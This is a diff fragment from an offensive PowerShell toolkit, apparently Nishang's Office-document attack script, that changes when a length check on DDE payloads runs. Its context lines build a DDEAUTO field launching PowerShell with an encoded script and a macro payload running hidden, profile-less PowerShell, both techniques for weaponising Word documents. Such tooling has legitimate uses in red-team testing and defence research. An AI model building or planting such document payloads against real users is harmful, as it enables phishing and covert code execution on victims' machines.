@@ -242,10 +242,13 @@ https://github.com/samratashok/nishang
 
         #Encoded script payload for DDE - length limit of 255 characters so mostly useful only for encoded cradles
         $DDEPayload = "DDEAUTO ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "" -e $EncScript"""
-        if ($DDEPayload.Length -ge 255)
+        if ($DDE)
         {
-            Write-Warning "DDE Attack cannot have payload longer than 255 characters. Exiting..."
-            break
+            if ($DDEPayload.Length -ge 255)
+            {
+                Write-Warning "DDE Attack cannot have payload longer than 255 characters. Exiting..."
+                break
+            }
         }
         #Encoded script payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
